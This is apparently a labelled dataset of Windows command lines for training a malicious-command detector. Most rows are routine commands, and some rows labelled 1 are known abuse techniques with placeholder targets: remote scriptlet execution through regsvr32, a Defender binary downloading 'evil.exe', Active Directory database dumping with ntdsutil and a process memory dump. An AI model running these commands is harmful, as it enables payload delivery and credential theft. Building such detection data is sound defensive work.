Command,Label
dir.exe D:\Data,0
"certutil.exe -hashfile ""D:\Users\bdyfslyr.sys"" SHA256",0
"findstr /C:""tAlFVEHWg5DM"" ""D:\Temp\iocsphv.exe""",0
"powershell -Command ""Get-ChildItem -Path C:\Users\blcx\Pictures -Recurse | Select-Object FullName, Length""",0
"echo.exe %DATE% %TIME% >> ""C:\Windows\qxrqdgktd.dll""",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
extend [size=614] [disk=614] [noerr],0
"powershell.exe -Command ""Get-Process""",0
C:\Program Files\netstat.exe -an,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\soluitkp\Pictures\Downloads -Recurse | Select-Object FullName, Length""",0
"C:\Windows\type.exe ""C:\Temp\Temp\bzffx.dat""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\hjgwwc.dat\"" \""C:\AppData\svgopta.dll\"""" /sc daily /st 23:00",0
"del ""D:\Users\dpfzbezt\Documents\Downloads\aiydtvsh.ini"" /f /q",0
ping 192.168.155.87,0
"powershell.exe -Command ""Get-ChildItem -Path D:\Logs\Temp -Recurse | Select-Object FullName, Length""",0
"echo %DATE% %TIME% >> ""D:\AppData\qdwze.exe""",0
"type ""C:\AppData\wvyykfkd.dll""",0
net.exe user service /add,0
mspub.exe {REMOTEURL},1
"type ""D:\Program Files\Temp\efhouxnt.exe""",0
"certutil -hashfile ""D:\Users\klwtabak\Documents\Desktop\lfbwt.exe"" SHA256",0
dir.exe C:\Temp,0
"echo.exe %DATE% %TIME% >> ""C:\Logs\nnczhalf.ini""",0
"mkdir.exe ""C:\Users\bfpuxk\Documents\Downloads""",0
echo.exe 1qalmPI8jtYm > D:\Program Files\xznlhesv.txt,0
netsh.exe advfirewall show allprofiles,0
net.exe use Z: \\192.168.70.12\data,0
"echo %DATE% %TIME% >> ""C:\AppData\Program Files\lhbxhgcwc.txt""",0
"powershell.exe -Command ""Get-Service""",0
echo.exe NGntbCywgeso > C:\Windows\sgsqxnttc.txt,0
"move ""C:\Program Files\Program Files\vcuzl.ini"" ""C:\Users\vvpks\Pictures\Pictures\rdpdabmkdj.sys""",0
ping.exe 192.168.85.52,0
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap,1
"type ""D:\Program Files\hfddviqpvo.log""",0
"del ""C:\Users\AppData\reusnzo.txt"" /f /q",0
"echo.exe %DATE% %TIME% >> ""D:\Windows\AppData\jhnvjt.sys""",0
ping 192.168.240.184,0
"C:\Windows\System32\fsutil.exe file layout ""D:\Users\Users\qcwgbrm.sys""",0
"attrib.exe +h ""D:\Windows\Windows\vxxkyfmxie.dat""",0
Powerpnt.exe {REMOTEURL},1
Extexport.exe {PATH_ABSOLUTE:folder} foo bar,1
"type.exe ""D:\Windows\AppData\gnzjhh.txt""",0
net use Z: \\192.168.148.33\public,0
"copy ""D:\Users\Windows\affxku.log"" ""D:\Windows\Temp\wwdkuo.exe""",0
net use Z: \\192.168.48.138\public,0
net.exe use Z: \\192.168.117.79\data,0
net.exe use Z: \\192.168.230.29\public,0
"certutil.exe -hashfile ""C:\Program Files\Program Files\pzabgqcrd.sys"" SHA256",0
fsutil.exe volume [filelayout] <volumepath> <fileID>,0
net use Z: \\192.168.221.97\public,0
"del ""D:\Users\ztcui\Desktop\Pictures\txwvsx.log"" /f /q",0
"rmdir ""C:\Program Files\AppData"" /s /q",0
"certutil -hashfile ""C:\Temp\xlpipwwv.exe"" SHA256",0
"del ""D:\Temp\Users\hszgky.ini"" /f /q",0
"copy.exe ""C:\AppData\AppData\fqbyuska.dat"" ""C:\Users\oyelbsnp\Downloads\Documents\bizrbi.dat""",0
"fsutil file layout ""C:\Logs\AppData\byqagwxl.sys""",0
certutil.exe -hashfile document.txt SHA256,0
"dir ""D:\Users\zcngtizw\Documents\Downloads"" /s /b",0
"rmdir.exe ""D:\Temp\Temp"" /s /q",0
"findstr.exe /C:""eT5dB4MHdVeD"" ""C:\Temp\Temp\asuwlw.dat""",0
offline volume,0
C:\Program Files\ipconfig.exe /all,0
net localgroup Administrators yjdtqdel /add,0
"fsutil.exe file layout ""C:\Logs\Program Files\dnbdr.txt""",0
"rmdir ""D:\Users\wawv\Desktop\Desktop"" /s /q",0
arp.exe -a,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Logs\Program Files\unhcjsvdz.dat\"" \""D:\AppData\Program Files\ffspt.dll\"""" /sc daily /st 23:00",0
reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
echo.exe czZi8IHnnRKb > D:\Users\gcqzbm.dat,0
create lun automagic size=<n> [noerr],0
"lbpolicy set lun type.exe=<type> [paths=D:\Logs\Users-{primary | <weight>}[,D:\Logs\Users-{primary | <weight>}[,…]]]",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\Logs\iyratf.log\"" \""C:\Users\mjlbuj.sys\"""" /sc daily /st 23:00",0
stordiag.exe,1
"E:\Windows\echo.exe %DATE% %TIME% >> ""C:\Program Files\vkzdq.dll""",0
"icacls.exe ""C:\Users\jtojemtc\Downloads\Pictures\skysrcvdb.ini"" /grant Everyone:F",0
"dir ""C:\Logs\Temp""",0
netsh.exe advfirewall show allprofiles,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\iqsly\Documents -Recurse | Select-Object FullName, Length""",0
net use Z: \\192.168.172.151\data,0
"dir ""C:\Users\jazebqyv\Documents"" /s /b",0
net.exe use Z: \\192.168.16.141\backup,0
"del ""C:\Program Files\Program Files\skcno.dat"" /f /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\AppData\knhgcouqy.txt\"" \""D:\AppData\Logs\ytkarxl.ini\"""" /sc daily /st 23:00",0
net.exe localgroup Administrators uifuagal /add,0
"certutil.exe -hashfile ""C:\Windows\Windows\sxmeastea.txt"" SHA256",0
net user kzqqipvq /add,0
"echo.exe %DATE% %TIME% >> ""C:\AppData\eipsschl.ini""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\kzucz.sys\"" \""D:\Windows\mmdqax.txt\"""" /sc daily /st 23:00",0
"associate targets [add] <n>[,<n> [,…]]",0
net.exe use Z: \\192.168.151.137\public,0
cmd.exe /c dir D:\Data,0
setflag drive hotspare={true | false},0
"C:\Windows\System32\copy.exe ""D:\Users\fgvushnmb.dll"" ""C:\Program Files\sbirigy.dat""",0
#pragma delete_TRAP_DEST <communityname> <hostID>,0
netstat.exe -an,0
"DISKRAID> ASSOCIATE PORTS 0-0,0-1",0
"findstr.exe /C:""wnFGDdq8GqYw"" ""C:\Program Files\Temp\neutf.txt""",0
net.exe localgroup Administrators kokzunav /add,0
ping.exe 192.168.85.250,0
net user iwxsjvsb /add,0
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,1
net.exe use Z: \\192.168.208.98\backup,0
echo.exe Yw5CMOKgniNx > C:\AppData\AppData\lofihvepmr.log,0
gpt attributes=459,0
tasklist.exe /v,0
"fsutil.exe file layout ""D:\Windows\lqfcah.txt""",0
"D:\Windows\findstr.exe /C:""FK7tOAY7EVPw"" ""D:\AppData\Program Files\wfkfb.dll""",0
"findstr.exe /C:""lKNGSpq0ztFd"" ""C:\Users\qfwugb\Desktop\ozusqiv.ini""",0
"move.exe ""C:\Users\aejeg\Pictures\Downloads\cqdfhmlkwo.dat"" ""C:\Program Files\Users\wxigg.dll""",0
"dir.exe ""C:\Users\prhw\Downloads""",0
"del ""D:\Users\ayxcnqshc.log"" /f /q",0
pause,0
"echo.exe %DATE% %TIME% >> ""C:\Users\ucozq\Downloads\Downloads\wrdqeer.dll""",0
"dir ""D:\Logs\AppData"" /s /b",0
"C:\Windows\System32\icacls.exe ""D:\AppData\ultig.dll"" /grant Everyone:F",0
arp.exe -a,0
"echo.exe %DATE% %TIME% >> ""C:\Temp\cmbyygw.txt""",0
"powershell -Command ""Get-ChildItem -Path D:\AppData -Recurse | Select-Object FullName, Length""",0
echo.exe 6DKaHJD1Ibir > C:\Logs\Windows\irnmrtanuq.sys,0
dir.exe C:\Users\Documents,0
net localgroup Administrators kxhkvall /add,0
net localgroup Administrators njgsiebq /add,0
C:\Program Files\systeminfo.exe,0
"powershell.exe -Command ""Get-Process""",0
"C:\Windows\System32\mkdir.exe ""C:\Logs\Logs""",0
"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",1
"icacls ""C:\Program Files\Program Files\unehyjgpgn.ini"" /grant Everyone:F",0
"type ""D:\Users\qfmmitm\Downloads\hzmgqs.exe""",0
"dir ""C:\AppData""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\jrrbbphug.dat\"" \""D:\Logs\tirjlyz.log\"""" /sc daily /st 23:00",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Temp\Temp\ircdhuvi.txt\"" \""D:\Users\mihwzc\Desktop\nkyhqttpu.log\"""" /sc daily /st 23:00",0
"fsutil.exe file layout ""C:\Users\Windows\uoyenwrhwx.txt""",0
"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{cmd.exe}"" /sc daily",1
netsh.exe advfirewall show allprofiles,0
C:\Program Files (x86)\netsh.exe advfirewall show allprofiles,0
"fsutil.exe file layout ""D:\Temp\mudzdoophh.ini""",0
diskshadow/add/expose 085e479a-5656-4785-a8b2-603e7911a5db {C | <share> | <mountpoint>},0
"certutil.exe -hashfile ""C:\AppData\Windows\nlsiynu.txt"" SHA256",0
ping.exe 192.168.54.40,0
ping.exe 192.168.11.189,0
"fsutil.exe file layout ""C:\Logs\rxheguolq.ini""",0
echo 20D78V0GulOd > D:\Program Files\bqohymz.ini,0
fsutil.exe devdrv trust [/f] C:\AppData\Users,0
net localgroup Administrators sajmneyt /add,0
"powershell.exe -Command ""Get-ChildItem -Path D:\Users\vahdf\Desktop -Recurse | Select-Object FullName, Length""",0
"dir.exe ""C:\Users\yctrtyud\Downloads\Downloads"" /s /b",0
"findstr /C:""F7LhQzVetZQy"" ""D:\AppData\ymyfkhvxk.exe""",0
fsutil volume [diskfree] D:\Users\uyrc\Documents,0
net.exe user mgmyeejr /add,0
diskshadow/add/delete shadows [all | volume <volume> | oldest <volume> | set <setID> | id b3bcec3a-5c0c-4ce2-8e44-4a5cd80aa720 | exposed {E | <mountpoint>}],0
"icacls ""C:\Windows\Windows\guekgnn.dll"" /grant Everyone:F",0
"echo.exe %DATE% %TIME% >> ""C:\Users\gezjg\Pictures\Pictures\aakvyqo.txt""",0
"C:\Windows\certutil.exe -hashfile ""D:\AppData\wxtlkgdczm.txt"" SHA256",0
for {%% | %}file in ((*.txt *.log)) do C:\Windows\System32\echo.exe @file [<commandlineoptions>],0
systeminfo.exe,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""C:\Windows\Temp\ugvyc.sys""",0
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",1
echo 83v7Kfc5ie4B > C:\Users\orjsnriv.exe,0
netsh.exe advfirewall show allprofiles,0
systeminfo.exe,0
Runonce.exe /AlternateShellStartup,1
netstat.exe -an,0
"C:\Windows\System32\attrib.exe +h ""C:\Logs\Users\awggt.dll""",0
net.exe user ycuxdnpo /add,0
C:\Windows\System32\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
wmic.exe process list brief,0
ping 192.168.110.217,0
"C:\Windows\System32\fsutil.exe file layout ""D:\Program Files\Temp\hkkujqgj.sys""",0
C:\Program Files\arp.exe -a,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\hpdtrms.dat\"" \""D:\Temp\loxfxr.dll\"""" /sc daily /st 23:00",0
ping.exe 192.168.31.208,0
"findstr.exe /C:""1OmbM3VFkW3e"" ""D:\Program Files\vnbvc.txt""",0
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",1
"echo %DATE% %TIME% >> ""C:\Logs\Logs\ikssrasrtk.exe""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\ixrdakmzzj.dat\"" \""C:\Logs\Temp\fpdipwq.sys\"""" /sc daily /st 23:00",0
net.exe use Z: \\192.168.81.31\public,0
net.exe use Z: \\192.168.150.34\backup,0
C:\Windows\net.exe user fnxmqyat /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Program Files\Users\pykkn.txt\"" \""D:\Temp\Windows\fqwnfrehre.log\"""" /sc daily /st 23:00",0
"echo.exe %DATE% %TIME% >> ""D:\Temp\cedmioko.sys""",0
C:\Windows\System32\arp.exe -a,0
"mkdir.exe ""C:\AppData""",0
"del ""C:\Users\AppData\tkqajp.sys"" /f /q",0
"fsutil.exe file layout ""C:\Logs\sufcmvheg.log""",0
net use Z: \\192.168.75.11\data,0
net.exe localgroup Administrators backup /add,0
net.exe user backup /add,0
"powershell.exe -Command ""Get-Service""",0
"C:\Windows\System32\type.exe ""D:\AppData\croykt.ini""",0
echo F8qrdiJcVLPw > C:\AppData\Windows\ojyfldwo.txt,0
cmd.exe /c dir D:\Data,0
net.exe use Z: \\192.168.159.116\backup,0
"E:\Windows\System32\copy.exe ""D:\Logs\qucvevrhu.dat"" ""C:\Program Files\Temp\dvqggixhn.sys""",0
ping.exe 192.168.189.178,0
"type ""D:\Users\xhotkeio\Pictures\Documents\fdcrgvxb.exe""",0
"copy ""D:\Users\nllhwzom\Documents\Downloads\kyzupjsic.sys"" ""C:\Users\ngxf\Documents\rqjbiqza.exe""",0
attrib.exe +r backup.dat,0
"C:\Windows\certutil.exe -hashfile ""D:\Temp\Program Files\hdkctovlu.dll"" SHA256",0
regasm.exe {PATH:.dll},1
"certutil -hashfile ""C:\Users\absr\Documents\Pictures\txrjmnbtkl.sys"" SHA256",0
type.exe {PATH_ABSOLUTE} > {PATH_SMB},1
DISKRAID> ASSOCIATE PORTS ADD 1-1,0
"findstr.exe /C:""678jLbytikDb"" ""C:\Temp\sczjfu.sys""",0
net.exe use Z: \\192.168.213.201\data,0
"C:\Windows\System32\rmdir.exe ""C:\Logs\Users"" /s /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\cskl\Documents\Documents\zzakqyk.exe\"" \""D:\Windows\AppData\njvthsn.log\"""" /sc daily /st 23:00",0
"copy ""D:\AppData\Temp\yfpte.dll"" ""D:\Windows\Temp\qonoesro.exe""",0
ping.exe 192.168.182.114,0
C:\Windows\ping.exe 192.168.82.45,0
net.exe use Z: \\192.168.242.211\public,0
"dir.exe ""C:\Windows\Program Files"" /s /b",0
add alias VEUCMQHC 401acf4c-eb6e-4d77-bc53-373a722efa6d,0
"dir ""D:\Program Files\Logs""",0
"copy ""D:\Users\yarmqy\Desktop\izhden.dll"" ""D:\Temp\Windows\dmoafi.log""",0
"dir.exe ""C:\Users\xcldfxj\Pictures"" /s /b",0
arp.exe -a,0
"mkdir ""D:\Windows\Users""",0
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},1
"mkdir.exe ""D:\Users\brtob\Documents""",0
tasklist.exe /v,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Windows -Recurse | Select-Object FullName, Length""",0
C:\Windows\net.exe user yobuwbgz /add,0
"C:\Windows\certutil.exe -hashfile ""C:\Users\Program Files\wltycsf.sys"" SHA256",0
dir.exe C:\Users\Documents,0
"attrib.exe +h ""D:\AppData\Logs\rrijkrxsx.log""",0
"move.exe ""D:\AppData\Program Files\hoacvvvpb.ini"" ""C:\Users\Windows\wtortuhb.dat""",0
"E:\Windows\System32\findstr.exe /C:""C4jekHrx14fV"" ""C:\Windows\Users\sirfttmag.dat""",0
"powershell.exe -Command ""Get-Service""",0
ping.exe 192.168.178.93,0
"dir ""C:\AppData\Users"" /s /b",0
"mkdir ""C:\Users\uhwnlmze\Desktop""",0
"attrib +h ""D:\Temp\wfydeux.txt""",0
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,1
"icacls ""C:\Program Files\ujmozkxjj.exe"" /grant Everyone:F",0
"del ""C:\Windows\Windows\tgpuzgnd.ini"" /f /q",0
net.exe user guest /add,0
echo.exe YqS11tjo5COk > D:\Logs\swstyox.dat,0
"findstr.exe /C:""yp04mwXJTuxS"" ""C:\Program Files\doirdb.txt""",0
"copy ""C:\Logs\Program Files\lmyktvmwy.ini"" ""C:\Logs\dvipd.ini""",0
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",1
"mkdir.exe ""C:\Program Files""",0
"findstr /C:""PyodtAz2hINK"" ""D:\Users\zirczce.dat""",0
"certutil.exe -hashfile ""C:\Users\kbfgrksk\Documents\Pictures\revvofztgu.ini"" SHA256",0
"del ""C:\AppData\AppData\mnpxfz.log"" /f /q",0
"type ""C:\Users\Temp\unajaxen.exe""",0
net localgroup Administrators vqbakwsw /add,0
net user fcbvhmeg /add,0
net.exe localgroup Administrators knstqtng /add,0
dir.exe C:\Users\Documents,0
"C:\Windows\System32\certutil.exe -hashfile ""D:\Program Files\qyuqgpgup.dat"" SHA256",0
"type.exe ""C:\Logs\htuskqo.dat""",0
netsh.exe advfirewall show allprofiles,0
replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,1
"del ""D:\Logs\Logs\ixxzspaz.exe"" /f /q",0
"certutil.exe -hashfile ""D:\AppData\nscam.dll"" SHA256",0
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,1
"findstr.exe /C:""kcsgfAILezUc"" ""D:\Program Files\vdvlepirj.dat""",0
C:\Windows\ping.exe 192.168.1.1,0
"powershell.exe -Command ""Get-Process""",0
echo rVU8DhJMeFyX > D:\Program Files\AppData\cnnckcy.exe,0
net.exe localgroup Administrators kqcvpank /add,0
"wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\",1
"rmdir.exe ""D:\Users\tquk\Desktop"" /s /q",0
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,1
net.exe user dncupmiz /add,0
ping 192.168.187.87,0
"powershell -Command ""Get-ChildItem -Path C:\Users\eldfmwmy\Pictures\Desktop -Recurse | Select-Object FullName, Length""",0
net user prfqlalt /add,0
cmd.exe /c dir C:\Temp,0
"echo.exe %DATE% %TIME% >> ""D:\Users\qurft.txt""",0
"dir.exe ""D:\AppData\Logs"" /s /b",0
"mkdir ""D:\Windows\Windows""",0
"fsutil.exe file layout ""D:\Temp\pbiprls.log""",0
"del ""C:\Users\rxxcqxpu\Pictures\Downloads\cjellsy.dat"" /f /q",0
"tasklist.exe | find /v /i ""agent""",0
"icacls ""D:\AppData\Windows\cqdebwunhx.dll"" /grant Everyone:F",0
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",1
"fsutil file layout ""D:\Windows\xghnii.exe""",0
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1
C:\Windows\icacls.exe data.log /grant Everyone:R,0
"C:\Windows\System32\copy.exe ""D:\Users\bqbcy\Documents\uismvmyu.dll"" ""D:\Users\Program Files\glwpnr.dat""",0
D:\Windows\net.exe user okmwclzq /add,0
"powershell -Command ""Get-ChildItem -Path C:\Windows\Logs -Recurse | Select-Object FullName, Length""",0
ping 192.168.65.136,0
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},1
"fsutil.exe file layout ""D:\Program Files\Program Files\lowwi.dat""",0
"del ""C:\Program Files\Program Files\tgskj.txt"" /f /q",0
C:\Program Files (x86)\ping.exe 172.16.0.1,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\yvvszv.log\"" \""D:\AppData\klpwkyjji.ini\"""" /sc daily /st 23:00",0
HH.exe {REMOTEURL:.chm},1
"echo %DATE% %TIME% >> ""C:\Logs\AppData\hoitmzpgn.log""",0
"type ""C:\AppData\Users\bborxil.ini""",0
"type.exe ""C:\AppData\Temp\xllgwlvcy.txt""",0
arp.exe -a,0
"del ""C:\Users\AppData\kdriyof.sys"" /f /q",0
ping.exe 192.168.158.4,0
"fsutil file layout ""D:\Windows\skpywiz.dat""",0
"C:\Windows\System32\fsutil.exe file layout ""C:\Users\Users\zlpvlnl.ini""",0
ping.exe 192.168.225.223,0
"move.exe ""C:\AppData\Users\uefzz.sys"" ""C:\Temp\AppData\wpckhxzi.dll""",0
"certutil.exe -hashfile ""D:\Logs\Logs\kvnclp.dat"" SHA256",0
"findstr /C:""qnf9ls6Hj28t"" ""D:\Users\dyonitp\Documents\Downloads\odagcc.exe""",0
msbuild.exe @{PATH:.rsp},1
net.exe user kxjgtkap /add,0
echo.exe GDYbhlIUyKg1 > D:\Windows\Temp\vwnylv.dll,0
net user adgsiwfq /add,0
"echo %DATE% %TIME% >> ""C:\Users\AppData\ualcvi.exe""",0
tasklist.exe /v,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\omvfegyr\Downloads\gsasqcstp.log\"" \""C:\Temp\Temp\hkftgzu.ini\"""" /sc daily /st 23:00",0
Update.exe --updateRollback={REMOTEURL},1
whoami.exe /all,0
certutil.exe -hashfile document.txt SHA256,0
"fsutil.exe file layout ""D:\Program Files\rsrkbadb.sys""",0
"C:\Windows\type.exe ""D:\Users\AppData\tnxqgixfsl.log""",0
name {subsystem | lun | target} [zgbujqyq],0
fsutil usn [readdata] C:\Users\xyrboife\Documents\Downloads\uwwthp.txt,0
"copy ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"" C:\Users\Public\Downloads\MP.exe && chdir ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"" && ""C:\Users\Public\Downloads\MP.exe"" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe",1
"fsutil file layout ""C:\AppData\qkdtl.exe""",0
"move ""C:\AppData\itqtjo.dat"" ""D:\AppData\gudemo.dat""",0
C:\Program Files (x86)\ping.exe 8.8.8.8,0
tasklist.exe,0
"C:\Windows\System32\copy.exe ""C:\Windows\Users\ucqod.log"" ""C:\AppData\xpvjbqkw.sys""",0
net.exe use Z: \\192.168.193.121\data,0
"type.exe ""C:\AppData\Logs\giittgg.sys""",0
"rmdir.exe ""C:\Program Files"" /s /q",0
echo.exe g1HvQIzU0BdV > C:\Users\dkjmv\Documents\faiwxtddx.txt,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Windows\gaqckodfl.txt""",0
whoami.exe /all,0
"attrib +h ""D:\AppData\slclrxwmsy.dat""",0
"type.exe ""C:\AppData\Program Files\rrzjunk.dll""",0
"del ""C:\Users\rcwttvsj.ini"" /f /q",0
"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1
"del ""D:\Users\peisjj\Desktop\rkywmpmy.dat"" /f /q",0
"icacls ""C:\Logs\Windows\hurrfy.txt"" /grant Everyone:F",0
"C:\Windows\type.exe ""D:\Users\qkqgg\Downloads\tinxum.txt""",0
"C:\Windows\System32\icacls.exe ""D:\AppData\AppData\eucnwl.dll"" /grant Everyone:F",0
net.exe user backup /add,0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\rswlliu\Pictures -Recurse | Select-Object FullName, Length""",0
"C:\Windows\System32\attrib.exe +h ""D:\Program Files\xdvmzqsg.sys""",0
"C:\Windows\certutil.exe -hashfile ""C:\Temp\hhjybju.dat"" SHA256",0
C:\Windows\certutil.exe -hashfile config.ini SHA256,0
"powershell.exe -Command ""Get-Process""",0
net.exe use Z: \\192.168.118.6\data,0
"findstr /C:""5HBMklQQSR9d"" ""C:\Users\aksj\Desktop\Pictures\uzutxqel.txt""",0
Controller port associations changed.,0
net.exe use Z: \\192.168.146.224\backup,0
"fsutil file layout ""C:\Windows\Program Files\qczapyoaxk.dll""",0
"fsutil.exe file layout ""D:\Windows\Users\vrthqzxwvi.dat""",0
select {hbaport | iadapter | iportal | provider | subsystem | controller | port | drive | lun | tportal | target | tpgroup } [878],0
"move ""C:\Windows\kmqpumfvmu.exe"" ""D:\Users\Program Files\vwlzsidst.dll""",0
"mkdir.exe ""D:\Temp\Temp""",0
rasautou -d {PATH:.dll} -p export_name -a a -e e,1
"type ""D:\Temp\ksgbfqh.dat""",0
"powershell.exe -Command ""Get-Process""",0
"ssh localhost ""{C:\Windows\System32\cmd.exe}""",1
"fsutil.exe file layout ""D:\Windows\wuwag.dll""",0
"echo %DATE% %TIME% >> ""C:\Program Files\dhdvak.exe""",0
"dir.exe ""C:\Users\jiifbon\Desktop\Documents""",0
"dir.exe ""C:\Users\ccjvo\Pictures\Documents"" /s /b",0
"powershell.exe -Command ""Get-Service""",0
net.exe localgroup Administrators uafnlyxv /add,0
"powershell.exe -Command ""Get-Process""",0
"E:\Windows\echo.exe %DATE% %TIME% >> ""C:\Users\twzgp.sys""",0
"fsutil file layout ""C:\AppData\Logs\qozmkggf.dat""",0
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,1
"certutil -hashfile ""D:\Temp\uajnafh.dat"" SHA256",0
"fsutil file layout ""C:\Program Files\Users\cqvkwkg.sys""",0
net.exe localgroup Administrators izgfevjf /add,0
C:\Windows\wmic.exe process list brief,0
net localgroup Administrators ufckfsen /add,0
"rmdir ""C:\Users\ujsgvhlw\Pictures\Downloads"" /s /q",0
"copy.exe ""C:\AppData\AppData\xeari.log"" ""D:\Logs\idudm.sys""",0
net.exe use Z: \\192.168.5.96\public,0
"type.exe ""C:\Users\lxzj\Pictures\Documents\hndzzgjvg.txt""",0
"findstr.exe /C:""OmxtQKHiPpXd"" ""D:\AppData\Temp\ttgcbt.dll""",0
echo.exe iY6bUIGHUoG5 > D:\Temp\Logs\haobm.sys,0
ping.exe 192.168.65.225,0
"powershell -Command ""Get-ChildItem -Path D:\Windows\AppData -Recurse | Select-Object FullName, Length""",0
"echo.exe %DATE% %TIME% >> ""D:\AppData\Logs\vjzxyf.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Program Files\qbncldwrlj.ini\"" \""C:\Logs\Users\tvtsnng.exe\"""" /sc daily /st 23:00",0
wmic.exe process list brief,0
